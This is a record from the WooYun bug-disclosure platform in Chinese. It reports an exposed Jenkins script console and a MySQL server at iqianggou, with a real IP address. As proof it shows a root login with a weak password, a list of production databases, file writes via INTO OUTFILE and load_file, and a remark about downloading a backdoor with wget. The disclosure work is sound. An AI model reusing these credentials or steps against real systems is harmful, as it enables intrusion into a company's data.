{"id": 25629, "wybug_id": "wooyun-2015-0130879", "wybug_title": "iqianggou服务配置不当getshell可内网漫游", "wybug_corp": "上海多维度网络科技有限公司", "wybug_author": "new", "wybug_date": "2015-08-07 10:18", "wybug_open_date": "2015-09-21 10:20", "wybug_type": "网络未授权访问", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["运维管理不当", "内部系统对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-09-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  http://27.115.51.166/script命令执行，虽然是jenkins用户，但是有可写目录 ／data\n\n使用wget从网上下载一个后门脚本再跑起来，一切都OK了\n\n不对，地址里边好像还有其它的东东，什么192、172、10，你懂的后续影响有点严重，就不再深入，没有任何恶意操作   漏洞证明：  \nmysql -u root -p123456 -h 27.115.51.166Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 218Server version: 5.6.23-72.1 Percona Server (GPL), Release 72.1, Revision 0503478Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql> show databases;+----------------------------+| Database                   |+----------------------------+| information_schema         || backup_iqg_new_dev_0601    || backup_iqg_new_prod        || edusoho                    || employees                  || ezpublish                  || fff                        || fs                         || iqg_64832_all              || iqg_dev                    || iqg_main                   || iqg_main_staging           || iqg_manage_back            || iqg_new_dev_0601           || iqg_new_prod_0601          || iqg_prod_102275            || iqg_prod_68514             || iqg_prod_back              || iqg_staging                || iqg_staging_150302_old_bak || iqg_stats_backup           || iqianggou_old              || kunstmaanbundles           || mydb                       || mysql                      || performance_schema         || scourgen_test              || scourgen_test_1            || sonata_sandbox             || test                       |+----------------------------+30 rows in set (0.05 sec)\n好多数据，而且可以写文件看如下：                                                                         mysql> select 'this is a test,please give 20 rank' into outfile '/data/test.txt';Query OK, 1 row affected (0.07 sec)mysql> ／data/test.txt 请自行删除下图证明问题：mysql> select load_file('/data/test.txt');+-------------------------------------+| load_file('/data/test.txt')         |+-------------------------------------+| this is a test,please give 20 rank |+-------------------------------------+1 row in set (0.05 sec)mysql>    修复方案：  不用的系统删除看到给别人礼物了，连着找了两个搞危害的，不知道有没有我的我想每个漏洞要20rank不过分吧   版权声明：转载请注明来源 new@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}